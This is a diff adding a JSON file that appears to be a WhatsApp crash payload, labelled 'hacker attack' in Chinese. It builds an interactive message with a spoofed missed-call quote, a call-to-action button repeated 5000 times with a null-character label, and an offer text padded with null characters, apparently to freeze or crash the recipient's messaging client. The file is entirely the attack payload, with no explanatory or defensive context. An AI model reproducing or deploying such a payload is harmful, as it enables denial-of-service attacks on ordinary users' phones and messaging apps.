@@ -1,0 +1,27 @@
+{
+  "interactiveMessage": {
+    "body": {
+      "text": "🥏"
+    },
+    "footer": {
+      "text": "駭客攻擊"
+    },
+    "contextInfo": {
+      "remoteJid": "status@broadcast",
+      "participant": "13135550002@s.whatsapp.net",
+      "stanzaId": "666",
+      "quotedMessage": {
+        "callLogMesssage": {
+          "isVideo": true,
+          "callOutcome": "MISSED",
+          "durationSecs": "0",
+          "callType": "REGULAR"
+        }
+      }
+    },
+    "nativeFlowMessage": {
+      "buttons": "$repeatArray([{\"name\":\"cta_url\",\"buttonParamsJson\":\"{\\\"display_text\\\":\\\"\\\\u0000\\\",\\\"url\\\":\\\"\\\",\\\"merchant_url\\\":\\\"\\\",\\\"webview_interaction\\\":true,\\\"icon\\\":\\\"review\\\"}\"}],5000)",
+      "messageParamsJson": "{\"limited_time_offer\":{\"text\":\"$repeat(\\u0000,67)\",\"url\":\"\",\"copy_code\":\"\",\"expiration_time\":\"-1\"}}"
+    }
+  }
+}
